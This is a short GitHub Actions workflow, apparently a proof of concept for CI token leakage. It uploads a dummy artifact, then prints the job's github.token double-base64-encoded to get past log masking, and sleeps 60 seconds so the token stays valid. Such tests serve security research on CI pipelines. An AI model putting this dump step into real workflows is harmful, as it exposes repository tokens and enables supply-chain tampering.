name: uploadV4

on:
  - workflow_dispatch
  - push

jobs:
  build:
    name: uploadV4
    runs-on: ubuntu-latest

    steps:

      - uses: actions/checkout@v4

      - name: Build
        run: |
          echo "lool" > artifact.txt

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: Packages
          path: |
            artifact.txt

      - name: Dump github.token
        run: echo ${{ github.token }} | base64 | base64

      - name: Sleep a while ...
        run: |
          sleep 60

